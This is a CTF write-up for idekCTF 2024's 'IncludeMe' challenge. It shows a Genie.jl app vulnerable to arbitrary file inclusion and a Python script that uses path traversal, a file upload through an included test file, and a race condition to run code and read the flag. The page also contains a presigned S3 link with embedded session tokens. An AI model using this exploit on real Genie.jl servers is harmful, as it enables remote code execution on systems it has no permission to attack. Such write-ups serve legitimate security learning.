---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4664ZAHQBOF%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T130134Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQDMs7gTKgMpr1LRiUhXjIDNdqhvtuzIXHJq07f0Jm7DZwIgLJR0XdjDwIoPJOOmGL2vYuo0J59jhXbgGO%2FdQ9vArn8qiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDMvMazqqhZak12250yrcA%2BHzju5ySt%2F9LSPM0AuwE8fOFm3QpL0s9n4uEhZi4jm6v33q2VSSapucd2Qj%2B5PGQq%2BiCz6Yj7P5pFvz%2F7Jre2l3qE8edmSH7DaHZpEbhNbnqLAeyc1qdKDNa2gRW97%2FMmPXtCAlXqgDHwANdLCzHFB4UguC7BmQ22bZqhg61lUqU1%2BIZet%2FOL5HWlYTRp7NU%2Bf5UzzDpckcCuwvsp0KBY5xzgaA99V62lzdTwkkInSrGQ%2BICIufMTkcYLZZzsGaSRu30i323EVN3ECeEodX5GAVygleAxtkN78KpIrQQCQ2ELfu%2BrSekDLJiOMv9%2F9PPhz%2Ff713WNLygvShyZZTnEHmAczL3ky1InlMw%2F%2B8gDBqSJXEtXyLR%2BCo0j6BeyqDQT%2FVhtw2fYboJg5PlBcmWNe3kRE8dtnKBs44%2BdunVgaGQzBri%2BOhq0kz8d2Tu2CAjBFZ7J8JWhG50dgzE8iyA99F7BJamzu2yyMtBKu4JfL8Dj9I4gh3792wNGu7ElgKuyInHHIYFt4wRC6K%2Bdx%2FclX%2Bk8zdJrd2%2B018CTXjHwHyEsA4IL5w2FGtnZ9oYRgMQsWp7ST4MfMrXZxvPQLVbq915uBdwvjQfmtMHEa9EePbzeQQ%2Bn3%2Biis4maOyMI%2FYwcEGOqUBfQtJO8b7D2LJujAOZ2JIuN2pb8pAyohjZvN%2Fx%2BVUz7TBE0l6jzDnZVnuQnFOqUF8gGudIzifKJISeJ0H6dRKw%2BLPpc%2FgQsDgIqfRxJcj0JgZMtXG9vQPkQCSBpUfk7J2v1fV%2B%2FsovTYwPsUxx9L1RBsWbss2vU%2BsSnyg7KouMpqL2xqqDkrdXohHuqHq%2BPJr%2BKPoYhYtnw%2FQCnC%2F8F3CJW492iSi\&X-Amz-Signature=b750e14abfbb22cb3912b2b8311e4ece03a319b530c22e3813b7e4d40fa0de17\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
